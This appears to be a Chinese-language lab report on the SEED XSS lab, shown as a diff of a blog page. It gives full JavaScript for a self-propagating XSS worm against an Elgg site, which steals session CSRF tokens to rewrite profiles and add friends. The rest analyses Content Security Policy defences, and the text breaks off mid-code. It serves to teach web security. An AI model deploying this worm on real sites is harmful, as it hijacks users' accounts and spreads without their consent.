+<img src="https://s2.loli.net/2024/11/11/Vh2AUse35MKGTaH.png" alt="image-20241108232517098" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/11/11/EdvHYqx3Ia9uw1o.png" alt="image-20241111142824533" style="zoom:50%;" />
+<ul>
+<li>登录 boby 的账户，点击 Alice 的主页，发现 Boby 的主页也被感染，也自动添加了 Samy 为好友：</li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/8XZhNdObFuGxDem.png" alt="image-20241108232724981" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/11/11/oynx12LEd4gQFDO.png" alt="image-20241111143014197" style="zoom:50%;" />
+<p>这说明我们编写的这个 xss 蠕虫是自传播的，而且所有访问过 Samy 主页的人都会感染这个蠕虫并可以继续传播给别人。</p>
+<h3 id="2-dom-方法">2. DOM 方法<a hidden class="anchor" aria-hidden="true" href="#2-dom-方法">#</a></h3>
+<p>编写 XSS 蠕虫还可以使用 DOM APIs 从网页中检索自身的副本，从而将蠕虫传播到另一个人的资料中。</p>
+<p>下面的 JS 代码能获取自身的副本，并显示在网页上：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;worm&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">headerTag</span> <span class="o">=</span> <span class="s2">&#34;&lt;script id=\&#34;worm\&#34; type=\&#34;text/javascript\&#34;&gt;&#34;</span><span class="p">;</span> <span class="c1">//(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">jsCode</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;worm&#34;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span> <span class="c1">//(2)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">tailTag</span> <span class="o">=</span> <span class="s2">&#34;&lt;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;script&gt;&#34;</span><span class="p">;</span> <span class="c1">//(3)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wormCode</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">headerTag</span> <span class="o">+</span> <span class="nx">jsCode</span> <span class="o">+</span> <span class="nx">tailTag</span><span class="p">);</span> <span class="c1">//(4)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="nx">alert</span><span class="p">(</span><span class="nx">jsCode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><img src="https://s2.loli.net/2024/11/11/8QsWtSiqTDrgl3j.png" alt="image-20241111144428211" style="zoom:50%;" />
+<p>利用上面的机制，我们可以编写一个 xss 蠕虫：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;worm&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">headerTag</span> <span class="o">=</span> <span class="s2">&#34;&lt;script id=\&#34;worm\&#34; type=\&#34;text/javascript\&#34;&gt;&#34;</span><span class="p">;</span> <span class="c1">// (1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">jsCode</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;worm&#34;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span> <span class="c1">// (2)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">tailTag</span> <span class="o">=</span> <span class="s2">&#34;&lt;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;script&gt;&#34;</span><span class="p">;</span> <span class="c1">// (3)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">wormCode</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">headerTag</span> <span class="o">+</span> <span class="nx">jsCode</span> <span class="o">+</span> <span class="nx">tailTag</span><span class="p">);</span> <span class="c1">// (4)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//and Security Token __elgg_token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">userName</span><span class="o">=</span><span class="s2">&#34;&amp;name=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="s2">&#34;&amp;guid=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_ts=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_token=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">description</span><span class="o">=</span><span class="s2">&#34;&amp;description=&lt;p&gt;Your profile has been changed!!!&#34;</span><span class="o">+</span><span class="nx">wormCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//Construct the content of your url.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">content</span><span class="o">=</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">userName</span><span class="o">+</span><span class="nx">description</span><span class="o">+</span><span class="nx">guid</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">samyGuid</span><span class="o">=</span><span class="mi">59</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">sendurl1</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/profile/edit&#34;</span><span class="p">;</span> <span class="c1">//change profile
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">sendurl2</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/friends/add?friend=59&#34;</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="p">;</span> <span class="c1">//add samy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="o">!=</span><span class="nx">samyGuid</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//Create and send Ajax request to modify profile
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="nx">sendurl1</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="nx">sendurl2</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><p><strong>测试：</strong></p>
+<p>首先登陆 Alice 的账户，访问 Samy 的主页，发现 Alice 自动添加了 Samy 的好友，而且 Alice 的主页被感染。</p>
+<img src="https://s2.loli.net/2024/12/07/q7zU6CDx4tGerSP.png" alt="image-20241111150822060" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/11/11/EdvHYqx3Ia9uw1o.png" alt="image-20241111142824533" style="zoom:50%;" />
+<p>然后登陆 Boby 的账户，访问 Alice 的主页，发现 Boby 也自动添加了 Samy 的好友，而且 Samy 的主页被感染。</p>
+<img src="https://s2.loli.net/2024/12/07/epuz48ILRJhtQor.png" alt="image-20241111151026096" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/11/11/oynx12LEd4gQFDO.png" alt="image-20241111143014197" style="zoom:50%;" />
+<p>这样就说明了这个 XSS 蠕虫是自传播的，而且使用 DOM 方法实现。</p>
+<h2 id="task-7使用-csp-抵御-xss-攻击">Task 7：使用 CSP 抵御 XSS 攻击<a hidden class="anchor" aria-hidden="true" href="#task-7使用-csp-抵御-xss-攻击">#</a></h2>
+<p>访问以下三个URL：</p>
+<ul>
+<li><a href="http://www.example32a.com">http://www.example32a.com</a></li>
+<li><a href="http://www.example32b.com">http://www.example32b.com</a></li>
+<li><a href="http://www.example32c.com">http://www.example32c.com</a></li>
+</ul>
+<h3 id="1-网页前端代码分析">1. 网页前端代码分析<a hidden class="anchor" aria-hidden="true" href="#1-网页前端代码分析">#</a></h3>
+<p>这三个网页的源码如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>CSP Experiment<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>1. Inline: Nonce (111-111-111): <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area1&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>2. Inline: Nonce (222-222-222): <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area2&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>3. Inline: No Nonce: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area3&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>4. From self: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area4&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>5. From www.example60.com: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area5&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>6. From www.example70.com: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;area6&#39;</span><span class="p">&gt;</span>Failed<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>7. From button click:
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;alert(&#39;JS Code executed!&#39;)&#34;</span><span class="p">&gt;</span>Click me<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;111-111-111&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;area1&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;OK&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;222-222-222&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;area2&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;OK&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;area3&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;OK&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;script_area4.js&#34;</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.example60.com/script_area5.js&#34;</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.example70.com/script_area6.js&#34;</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>这个 HTML 页面用于测试内容安全策略（Content Security Policy, CSP）分为了 7 个测试部分：</p>
+<ol>
+<li>使用 nonce=&ldquo;111-111-111&rdquo; 的内联 JavaScript</li>
+<li>使用 nonce=&ldquo;222-222-222&rdquo; 的内联 JavaScript</li>
+<li>没有 nonce 的内联 JavaScript</li>
+<li>从同源加载的外部脚本</li>
+<li>从 <a href="http://www.example60.com">www.example60.com</a> 加载的外部脚本</li>
+<li>从 <a href="http://www.example70.com">www.example70.com</a> 加载的外部脚本</li>
+<li>通过按钮点击触发内联 JavaScript</li>
+</ol>
+<h3 id="2-csp-策略设置文件">2. CSP 策略设置文件<a hidden class="anchor" aria-hidden="true" href="#2-csp-策略设置文件">#</a></h3>
+<p>在 <code>/etc/apache2/sites-available/apache_csp.conf</code> 文件中保存了以上三个网页的 CSP 策略：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"># Purpose: Do not set CSP policies
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example32a.com
+</span></span><span class="line"><span class="cl">    DirectoryIndex index.html
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Purpose: Setting CSP policies in Apache configuration
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example32b.com
+</span></span><span class="line"><span class="cl">    DirectoryIndex index.html
+</span></span><span class="line"><span class="cl">    Header set Content-Security-Policy &#34; \
+</span></span><span class="line"><span class="cl">             default-src &#39;self&#39;; \
+</span></span><span class="line"><span class="cl">             script-src &#39;self&#39; *.example70.com \
+</span></span><span class="line"><span class="cl">           &#34;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Purpose: Setting CSP policies in web applications
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example32c.com
+</span></span><span class="line"><span class="cl">    DirectoryIndex phpindex.php
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Purpose: hosting Javascript files
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example60.com
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Purpose: hosting Javascript files
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example70.com
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span></code></pre></div><ul>
+<li><a href="www.example32a.com">www.example32a.com</a>：没有设置 CSP 安全策略</li>
+<li><a href="www.example32b.com">www.example32b.com</a>：允许加载同源的和<code>*.example70.com</code> 的 JavaScript 脚本。</li>
+<li><a href="www.example32c.com">www.example32c.com</a>：将首页文件设为 <code>phpindex.php</code>，通过PHP脚本控制CSP。</li>
+</ul>
+<h3 id="3-q--a">3. Q &amp; A<a hidden class="anchor" aria-hidden="true" href="#3-q--a">#</a></h3>
+<h4 id="31-描述并解释你访问这些网站时的观察结果">3.1 描述并解释你访问这些网站时的观察结果。<a hidden class="anchor" aria-hidden="true" href="#31-描述并解释你访问这些网站时的观察结果">#</a></h4>
+<ul>
+<li><a href="http://www.example32a.com">http://www.example32a.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/Zz5pdrGtkuAmQfx.png" alt="image-20241111154832471" style="zoom:50%;" />
+<p>7 个测试均为 OK，原因是 <a href="https://www.example32a.com">www.example32a.com</a> 没有设置 CSP 安全策略</p>
+<ul>
+<li><a href="http://www.example32b.com">http://www.example32b.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/dJeRNqi1EPuk7p4.png" alt="image-20241111163550043" style="zoom:50%;" />
+<p>可以发现前两个关于 Nonce 的测试都为 Failed，原因是 CSP 策略中没有添加相关的 Nonce 值，这会导致它们无法执行。第三项无 Nonce 值的也无法执行，原因是默认情况下，CSP 会阻止所有未带 <code>nonce</code> 的内联脚本，除非策略中明确允许。第四项和第六项可以执行是因为 CSP 策略中设置了可以加载同源的或者来自 <a href="https://www.example70.com">www.example70.com</a> 的 JS 脚本。第五项无法执行是由于 CSP 策略中没有允许加载来自 <a href="https://www.example60.com">www.example60.com</a> 的 JS 脚本。</p>
+<ul>
+<li><a href="http://www.example32c.com">http://www.example32c.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/5tuPV6JBjNnUSiR.png" alt="image-20241111164429770" style="zoom:50%;" />
+<p>可以发现第一项、第四项、第六项可以执行，原因是 <code>phpindex.php</code>指定了 CSP 策略，如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$cspheader</span> <span class="o">=</span> <span class="s2">&#34;Content-Security-Policy:&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;default-src &#39;self&#39;;&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;script-src &#39;self&#39; &#39;nonce-111-111-111&#39; *.example70.com&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="nv">$cspheader</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php include &#39;index.html&#39;;?&gt;
+</span></span></span></code></pre></div><p>允许了 Nonce 为 <code>nonce-111-111-111</code> 的 JS 脚本执行，并且允许同源的或者来自 <a href="https://www.example70.com">www.example70.com</a> 的 JS 脚本。</p>
+<h4 id="32-点击所有三个网站网页中的按钮描述并解释你的观察结果">3.2 点击所有三个网站网页中的按钮，描述并解释你的观察结果。<a hidden class="anchor" aria-hidden="true" href="#32-点击所有三个网站网页中的按钮描述并解释你的观察结果">#</a></h4>
+<ul>
+<li><a href="http://www.example32a.com">http://www.example32a.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/uzWYK7G8CbElMpa.png" alt="image-20241111164956777" style="zoom:50%;" />
+<p>可以发现通过按键触发的 JS 代码可以执行，原因是该网站没有设置 CSP 策略。</p>
+<ul>
+<li><a href="http://www.example32b.com">http://www.example32b.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/GuhTyg7XsRiM1xS.png" alt="image-20241111165235802" style="zoom:50%;" />
+<p>可以发现通过按键触发的 JS 代码不能执行，原因是按键触发属于内联事件，而 CSP 策略中设置了可以加载同源的或者来自 <a href="https://www.example70.com">www.example70.com</a> 的 JS 脚本，默认是无法执行内联事件的，所以不能执行。</p>
+<ul>
+<li><a href="http://www.example32c.com">http://www.example32c.com</a></li>
+</ul>
+<img src="https://s2.loli.net/2024/11/11/6cOpRGxa5YyBkuP.png" alt="image-20241111165705457" style="zoom:50%;" />
+<p>也是无法执行的，原因同上。</p>
+<h4 id="33-更改-example32b-上的服务器配置修改-apache-配置使-areas-5-和-6-显示-ok请在实验报告中写出你修改的配置">3.3 更改 example32b 上的服务器配置（修改 Apache 配置），使 Areas 5 和 6 显示 OK。请在实验报告中写出你修改的配置。<a hidden class="anchor" aria-hidden="true" href="#33-更改-example32b-上的服务器配置修改-apache-配置使-areas-5-和-6-显示-ok请在实验报告中写出你修改的配置">#</a></h4>
+<p>修改<code>/etc/apache2/sites-available/apache_csp.conf</code>配置为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"># Purpose: Setting CSP policies in Apache configuration
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">VirtualHost</span> <span class="err">*</span><span class="na">:80</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/csp
+</span></span><span class="line"><span class="cl">    ServerName www.example32b.com
+</span></span><span class="line"><span class="cl">    DirectoryIndex index.html
+</span></span><span class="line"><span class="cl">    Header set Content-Security-Policy &#34; \
+</span></span><span class="line"><span class="cl">             default-src &#39;self&#39;; \
+</span></span><span class="line"><span class="cl">             script-src &#39;self&#39; *.example70.com *.example60.com \
+</span></span><span class="line"><span class="cl">           &#34;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">VirtualHost</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>保存并重启 Apache 服务：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ service apache2 restart
+</span></span></code></pre></div><p>刷新页面：</p>
+<img src="https://s2.loli.net/2024/11/11/Y1XTtbJNrA6MaDe.png" alt="image-20241111172328742" style="zoom:50%;" />
+<h4 id="34-更改-example32c-上的服务器配置修改-php-代码使-areas-1245-和-6-都显示-ok请在实验报告中写出你修改的配置">3.4 更改 example32c 上的服务器配置（修改 PHP 代码），使 Areas 1、2、4、5 和 6 都显示 OK。请在实验报告中写出你修改的配置。<a hidden class="anchor" aria-hidden="true" href="#34-更改-example32c-上的服务器配置修改-php-代码使-areas-1245-和-6-都显示-ok请在实验报告中写出你修改的配置">#</a></h4>
+<p>修改 <code>/var/www/csp/phpindex.php</code>，如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$cspheader</span> <span class="o">=</span> <span class="s2">&#34;Content-Security-Policy:&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;default-src &#39;self&#39;;&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;script-src &#39;self&#39; &#39;nonce-111-111-111&#39; &#39;nonce-222-222-222&#39; *.example60.com *.example70.com
+</span></span></span><span class="line"><span class="cl"><span class="s2">               &#34;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  header(</span><span class="si">$cspheader</span><span class="s2">);
